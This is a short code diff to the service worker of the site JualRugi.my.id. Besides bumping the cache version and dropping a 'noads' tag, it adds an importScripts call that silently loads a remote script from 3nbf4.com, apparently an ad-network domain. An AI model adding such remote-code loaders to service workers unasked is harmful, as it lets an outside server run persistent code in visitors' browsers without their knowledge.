@@ -1,5 +1,14 @@
-// Service Worker JualRugi.my.id (Resilient Network-First with Offline Fallback v12)
-const CACHE_NAME = 'jualrugi-v12-pwa-noads';
+self.options = {
+    "domain": "3nbf4.com",
+    "zoneId": 12274190
+}
+self.lary = ""
+try {
+    importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
+} catch (e) {}
+
+// Service Worker JualRugi.my.id (Resilient Network-First with Offline Fallback v13)
+const CACHE_NAME = 'jualrugi-v13-pwa';
 
 const PRECACHE_ASSETS = [
   '/',
